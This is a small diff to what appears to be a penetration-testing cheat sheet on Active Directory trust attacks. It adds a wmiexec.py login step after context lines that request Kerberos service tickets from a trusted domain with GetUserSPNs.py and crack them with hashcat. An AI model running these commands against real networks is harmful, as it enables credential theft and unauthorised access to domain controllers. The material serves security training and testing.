@@ -259,6 +259,9 @@ GetUserSPNs.py -request -target-domain TRUSTED-DOMAIN.LOCAL CURRENT-DOMAIN.LOCAL
 
 # 3. Crack hash
 hashcat -m 13100 trusted_domain_tgs.txt /usr/share/wordlists/rockyou.txt
+
+# 4. Log in to the target
+python3 wmiexec.py TARGET-DOMAIN/<user>:<password>@DC-NAME.TARGET-DOMAIN.LOCAL
 ```
 
 ### Foreign Group Membership Abuse
